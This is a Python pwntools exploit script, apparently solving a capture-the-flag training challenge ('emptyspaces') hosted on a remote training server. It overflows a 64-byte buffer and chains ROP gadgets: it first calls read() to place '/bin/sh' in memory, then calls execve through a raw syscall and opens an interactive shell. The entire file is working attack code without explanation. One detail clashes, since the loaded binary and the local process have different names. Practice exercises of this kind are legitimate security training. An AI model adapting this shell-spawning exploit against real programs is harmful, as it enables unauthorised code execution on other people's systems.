from pwn import *
import sys

binary = ELF("./emptyspaces")
context.terminal = ['tmux', 'splitw', '-h']

if len(sys.argv) == 2 and sys.argv[1] == 'attack':
    r = remote('bin.training.jinblack.it', 4006)
else:
    r = process('./ropasaurusrex')
    gdb.attach(r, '''
        b *0x00400c14
        c
    ''')

input('press a key..')

r.recvuntil("Where we used to pwn?\n")

POP_RDX_RSI = 0x44bd59
POP_RDI = 0x400696
POP_RAX = 0x4155a4
SYSCALL = 0x40128c

# CALL READ FROM STDIN
payload = b'A'*64
payload += p64(0x6bc074)  #RBP 
payload += p64(POP_RDX_RSI)  #RIP
payload += p64(8)
payload += p64(0x6bc070)
payload += p64(POP_RDI)
payload += p64(0)
payload += p64(binary.symbols['read']) #address of the read function in the program

# RETURN TO MAIN
payload += p64(binary.symbols['main'])

r.send(payload)
input('press a key..')
r.send('/bin/sh')

# EXECVE 
payload = b'A'*64
payload += b'BBBBBBBB'  #RBP 
payload += p64(POP_RDX_RSI)
payload += p64(0)
payload += p64(0)
payload += p64(POP_RDI)
payload += p64(0x6bc070)
payload += p64(POP_RAX)
payload += p64(0x3b)
payload += p64(SYSCALL)

input('press a key..')
r.send(payload)

r.interactive()

    

